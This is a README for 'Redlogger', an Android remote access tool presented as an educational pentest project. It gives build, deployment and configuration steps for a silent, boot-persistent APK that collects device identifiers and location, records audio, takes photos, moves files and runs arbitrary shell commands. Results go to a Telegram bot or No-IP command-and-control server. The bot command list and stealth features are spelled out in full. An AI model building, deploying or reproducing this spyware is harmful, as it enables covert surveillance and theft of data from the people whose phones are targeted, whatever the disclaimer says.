# Redlogger - Android RAT for Educational Penetration Testing

Redlogger is an Android Remote Administration Tool (RAT) designed for educational purposes, specifically for penetration testing and understanding mobile security. It includes both a client-side application (APK) and a controller server, supporting flexible Command and Control (C2) mechanisms via Telegram Bot and No-IP.

## Project Objectives:

### Client (APK) Features:
- Runs silently in the background.
- Starts automatically on device boot.
- Collects device data: IMEI, Android version, battery status, and location (if permissions allow).
- Accesses the microphone for ambient audio recording.
- Takes pictures using the device camera.
- Lists, uploads, and downloads files from the device.
- Executes shell commands on the device.
- Sends collected data and command output back to the C2 server via Telegram Bot API or HTTP POST to a No-IP URL.

### Controller (Bot/Server) Features:
- Implemented as a Python Flask or FastAPI server.
- Functions as either:
  - A Telegram bot listener (using `python-telegram-bot`) for remote control via bot commands.
  - A No-IP-based HTTP server to receive commands and logs from the client.
- Logs all activities per unique device ID.
- Designed for easy deployment on platforms like Termux, Codespaces, or Railway (free-tier friendly).

## Required Structure:

- `redlogger_client/` (Android APK)
  - Developed in Python with Kivy or pure Java.
  - Compiled into an Android APK using Buildozer.
  - `buildozer.spec` configured with necessary permissions.
  - Communicates via Telegram Bot API or directly to the No-IP C2 domain.

- `controller/` (Bot/Server)
  - Contains Telegram bot logic for command reception and output replies.
  - Includes an optional HTTP server for handling device POST requests from the APK.

- `.github/workflows/build.yml`
  - GitHub Actions workflow for automated APK building and upload.

- `README.md`
  - This comprehensive guide.

## Requirements:

- Python 3.10 (or 3.11)
- No Firebase or Google Play Store services.
- Targets Android 7 and above.
- Silent background operation.
- Lightweight and stable.

## Getting Started:

Detailed instructions for compiling the client, deploying the controller, and setting up the C2 mechanisms will be provided in this `README.md`.




## 🚀 Quick Start Guide

### Prerequisites

- Python 3.10 or 3.11
- Android device or emulator (Android 7+)
- Telegram account (for bot setup)
- No-IP account (optional, for DDNS)

### 1. Setting Up the Controller

#### Option A: Local Development

```bash
# Clone the repository
git clone https://github.com/yourusername/redlogger.git
cd redlogger

# Run the deployment script
chmod +x deploy.sh
./deploy.sh --local
```

#### Option B: Railway Deployment (Recommended)

```bash
# Install Railway CLI
npm install -g @railway/cli

# Set environment variables
export TELEGRAM_BOT_TOKEN="your_bot_token_here"
export TELEGRAM_CHAT_ID="your_chat_id_here"

# Deploy to Railway
./deploy.sh --railway
```

#### Option C: Docker Deployment

```bash
# Build and run with Docker
./deploy.sh --docker

# Run the container
docker run -p 5000:5000 \
  -e TELEGRAM_BOT_TOKEN="your_bot_token" \
  -e TELEGRAM_CHAT_ID="your_chat_id" \
  redlogger-controller
```

### 2. Setting Up Telegram Bot

1. **Create a Telegram Bot:**
   - Message @BotFather on Telegram
   - Send `/newbot` and follow the instructions
   - Save the bot token (e.g., `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

2. **Get Your Chat ID:**
   - Start a conversation with your bot
   - Send any message to the bot
   - Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
   - Find your chat ID in the response

3. **Configure the Bot:**
   ```bash
   export TELEGRAM_BOT_TOKEN="123456789:ABCdefGHIjklMNOpqrsTUVwxyz"
   export TELEGRAM_CHAT_ID="987654321"
   ```

### 3. Setting Up No-IP (Optional)

1. **Register at No-IP:**
   - Go to [no-ip.com](https://www.noip.com)
   - Create a free account
   - Create a hostname (e.g., `your-domain.ddns.net`)

2. **Configure DDNS Updater:**
   ```bash
   # Edit the updater script
   nano controller/noip-updater.sh
   
   # Update these variables:
   NOIP_USERNAME="your_noip_username"
   NOIP_PASSWORD="your_noip_password"
   NOIP_HOSTNAME="your-domain.ddns.net"
   
   # Set up automatic updates
   ./controller/setup-cron.sh
   ```

### 4. Building the Android APK

#### Option A: GitHub Actions (Recommended)

1. Fork this repository
2. Push your changes to trigger the build
3. Download the APK from the Actions artifacts

#### Option B: Local Build with Buildozer

```bash
# Install dependencies (Ubuntu/Debian)
sudo apt-get update
sudo apt-get install -y git zip unzip openjdk-17-jdk python3-pip autoconf libtool pkg-config zlib1g-dev libncurses5-dev libncursesw5-dev libssl-dev

# Install Buildozer
pip install buildozer

# Build the APK
cd redlogger_client
buildozer android debug
```

#### Option C: Termux Build

```bash
# Install Termux packages
pkg update && pkg upgrade
pkg install python git openjdk-17 clang

# Install Buildozer
pip install buildozer

# Build the APK
cd redlogger_client
buildozer android debug
```

### 5. Configuring the Android Client

Before building or after installation, configure the client:

1. **Edit Configuration:**
   ```python
   # In redlogger_client/main.py
   TELEGRAM_BOT_TOKEN = 'your_bot_token_here'
   TELEGRAM_CHAT_ID = 'your_chat_id_here'
   NOIP_URL = 'http://your-domain.ddns.net:5000'  # Optional
   ```

2. **Environment Variables (Preferred):**
   ```bash
   # Set environment variables before building
   export TELEGRAM_BOT_TOKEN="your_bot_token"
   export TELEGRAM_CHAT_ID="your_chat_id"
   export NOIP_URL="http://your-domain.ddns.net:5000"
   ```

### 6. Installing and Testing

1. **Install the APK:**
   ```bash
   # Enable developer options and USB debugging
   adb install redlogger_client/bin/redlogger-0.1-debug.apk
   ```

2. **Grant Permissions:**
   - Open the app once to trigger permission requests
   - Grant all requested permissions
   - Enable "Display over other apps" if prompted

3. **Test the Connection:**
   - Start the controller server
   - Check the web interface at `http://localhost:5000`
   - Send Telegram commands to your bot

## 📱 Android Client Features

### Core Functionality

- **Silent Operation:** Runs in the background without user interface
- **Boot Persistence:** Automatically starts when the device boots
- **Stealth Mode:** Minimal battery and resource usage

### Data Collection

- Device information (IMEI, model, manufacturer)
- Android version and system details
- Battery status and level
- Network information (WiFi SSID, connection type)
- Storage and RAM usage
- Location data (if permissions granted)

### Remote Commands

- **Shell Commands:** Execute any shell command remotely
- **File Operations:** List, upload, and download files
- **Audio Recording:** Record ambient audio for specified duration
- **Photo Capture:** Take photos using device cameras
- **System Information:** Get detailed system and network info

### Communication Methods

- **Telegram Bot:** Real-time command and control via Telegram
- **HTTP POST:** Direct communication with No-IP hosted server
- **Dual Channel:** Can use both methods simultaneously

## 🎛️ Controller Features

### Web Interface

- **Device Management:** View all connected devices
- **Real-time Commands:** Send commands through web interface
- **Activity Logs:** Monitor all device activities
- **Quick Commands:** Pre-defined common operations

### Telegram Bot Commands

```
/start          - Show available commands
/devices        - List all connected devices
/logs <device>  - Show device logs
/cmd <device> <command> - Execute shell command
/audio <device> [duration] - Record audio
/photo <device> - Take photo
/files <device> [path] - List files
/upload <device> <file> - Upload file from device
/download <device> <url> <path> - Download file to device
```

### Database Logging

- **Device Registry:** Track all connected devices
- **Command History:** Log all executed commands
- **Activity Timeline:** Complete audit trail
- **SQLite Storage:** Lightweight, portable database

## 🔧 Advanced Configuration

### Custom Commands

Add custom commands to the controller:

```python
# In controller/redlogger_controller/src/main.py
async def custom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Your custom command logic here
    pass

# Register the command
application.add_handler(CommandHandler("custom", custom_command))
```

### Security Hardening

1. **Change Default Secrets:**
   ```python
   # Update Flask secret key
   app.config['SECRET_KEY'] = 'your-secure-random-key'
   ```

2. **Enable HTTPS:**
   ```python
   # Use SSL certificates
   app.run(host='0.0.0.0', port=5000, ssl_context='adhoc')
   ```

3. **Restrict Access:**
   ```python
   # Add IP whitelisting
   from flask import request, abort
   
   @app.before_request
   def limit_remote_addr():
       if request.remote_addr not in ['127.0.0.1', 'your-ip']:
           abort(403)
   ```

### Performance Tuning

1. **Database Optimization:**
   ```sql
   -- Add indexes for better performance
   CREATE INDEX idx_device_id ON logs(device_id);
   CREATE INDEX idx_timestamp ON logs(timestamp);
   ```

2. **Memory Management:**
   ```python
   # Limit log retention
   def cleanup_old_logs():
       conn = sqlite3.connect('database/redlogger.db')
       cursor = conn.cursor()
       cursor.execute('DELETE FROM logs WHERE timestamp < datetime("now", "-30 days")')
       conn.commit()
       conn.close()
   ```

## 🧪 Testing and Validation

### Emulator Testing

1. **Android Studio Emulator:**
   ```bash
   # Create and start emulator
   avd create -n test_device -k "system-images;android-27;google_apis;x86"
   emulator -avd test_device
   ```

2. **Install and Test:**
   ```bash
   adb install bin/redlogger-0.1-debug.apk
   adb shell am start -n org.redlogger.redlogger/.MainActivity
   ```

### Network Testing

1. **Local Network:**
   ```bash
   # Test controller accessibility
   curl http://localhost:5000/api/devices
   ```

2. **External Access:**
   ```bash
   # Test No-IP domain
   curl http://your-domain.ddns.net:5000/api/devices
   ```

### Security Testing

1. **Permission Verification:**
   ```bash
   # Check granted permissions
   adb shell dumpsys package org.redlogger.redlogger | grep permission
   ```

2. **Network Traffic Analysis:**
   ```bash
   # Monitor network traffic
   adb shell tcpdump -i any -w /sdcard/traffic.pcap
   ```

## 🚨 Legal and Ethical Considerations

### Educational Use Only

This tool is designed for:
- Educational purposes and learning about Android security
- Authorized penetration testing with proper permissions
- Security research in controlled environments

### Prohibited Uses

Do NOT use this tool for:
- Unauthorized access to devices you don't own
- Illegal surveillance or privacy violations
- Malicious activities or cybercrime

### Best Practices

1. **Always obtain explicit permission** before installing on any device
2. **Use only in controlled environments** (your own devices, lab environments)
3. **Respect privacy laws** and regulations in your jurisdiction
4. **Document your testing** for legitimate security assessments
5. **Remove the tool** after testing is complete

### Legal Disclaimer

Users are solely responsible for ensuring their use of this tool complies with all applicable laws and regulations. The developers assume no responsibility for misuse or illegal activities.

## 🛠️ Troubleshooting

### Common Issues

1. **APK Build Fails:**
   ```bash
   # Clear Buildozer cache
   buildozer android clean
   
   # Update Buildozer
   pip install --upgrade buildozer
   ```

2. **Permissions Denied:**
   ```bash
   # Grant permissions manually
   adb shell pm grant org.redlogger.redlogger android.permission.CAMERA
   adb shell pm grant org.redlogger.redlogger android.permission.RECORD_AUDIO
   ```

3. **Controller Not Accessible:**
   ```bash
   # Check firewall settings
   sudo ufw allow 5000
   
   # Verify port binding
   netstat -tlnp | grep 5000
   ```

4. **Telegram Bot Not Responding:**
   ```bash
   # Test bot token
   curl "https://api.telegram.org/bot<TOKEN>/getMe"
   
   # Check webhook status
   curl "https://api.telegram.org/bot<TOKEN>/getWebhookInfo"
   ```

### Debug Mode

Enable debug logging:

```python
# In main.py
import logging
logging.basicConfig(level=logging.DEBUG)
```

### Log Analysis

Check application logs:

```bash
# Controller logs
tail -f controller/redlogger_controller/app.log

# Android logs
adb logcat | grep redlogger
```

## 🔄 Updates and Maintenance

### Updating the Project

```bash
# Pull latest changes
git pull origin main

# Rebuild APK
cd redlogger_client
buildozer android clean
buildozer android debug

# Update controller dependencies
cd ../controller/redlogger_controller
pip install -r requirements.txt --upgrade
```

### Database Maintenance

```bash
# Backup database
cp controller/redlogger_controller/src/database/redlogger.db backup_$(date +%Y%m%d).db

# Clean old logs
sqlite3 controller/redlogger_controller/src/database/redlogger.db "DELETE FROM logs WHERE timestamp < datetime('now', '-30 days');"
```

## 📚 Additional Resources

### Documentation

- [Kivy Documentation](https://kivy.org/doc/stable/)
- [Buildozer Documentation](https://buildozer.readthedocs.io/)
- [Flask Documentation](https://flask.palletsprojects.com/)
- [Telegram Bot API](https://core.telegram.org/bots/api)

### Security Resources

- [OWASP Mobile Security](https://owasp.org/www-project-mobile-security-testing-guide/)
- [Android Security Guidelines](https://developer.android.com/topic/security)
- [Penetration Testing Frameworks](https://www.kali.org/)

### Community

- [GitHub Issues](https://github.com/yourusername/redlogger/issues)
- [Security Research Forums](https://www.reddit.com/r/netsec/)
- [Android Development Community](https://developer.android.com/community)




---

## 🌐 Language Support

- [العربية (Arabic)](README_ar.md)
- [English](README.md) (Current)

---

